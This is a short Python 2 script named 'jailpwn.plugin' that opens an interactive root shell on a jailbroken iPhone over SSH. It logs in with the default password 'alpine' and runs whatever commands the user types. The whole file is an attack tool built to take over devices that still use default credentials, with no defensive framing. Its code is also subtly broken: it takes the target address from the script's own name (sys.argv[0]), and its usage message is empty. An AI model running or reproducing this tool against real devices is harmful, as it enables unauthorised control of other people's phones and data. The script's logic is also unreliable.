#!/usr/bin/python

import paramiko  
import sys,time
import os, argparse
import logging

__plugin__      = "jailpwn.plugin"
__description__      = "somthing"

RescoursesDir = os.getcwd()

dandtime = time.strftime("%H:%M:%S")

logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)

class Tee(object):
  def __init__(self):
    self.file = open(logfile, 'a')
    self.stdout = sys.stdout

  def __del__(self):
    sys.stdout = self.stdout
    self.file.close()

  def write(self, data):
    self.file.write(data)
    self.stdout.write(data)

sys.stdout = Tee()

iphoneip = sys.argv[0]

def usage():
       if len(sys.argv) != 2:
               print ""
               sys.exit(1)
 
def exploit(iphoneip,cmd):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(iphoneip,username='root',password='alpine')
        stdin, stdout, stderr = ssh.exec_command(cmd)
        resp = stdout.readlines()
        print resp     
        ssh.close()
 
 
usage()
time.sleep(1.3)
cmd = " "
while (cmd != "quit"):
        try:
                cmd = raw_input("shell:iphone ~$ ")
                exploit(iphoneip,cmd)
        except KeyboardInterrupt:
                print "\nQuiting . . \n"
                sys.exit(1)
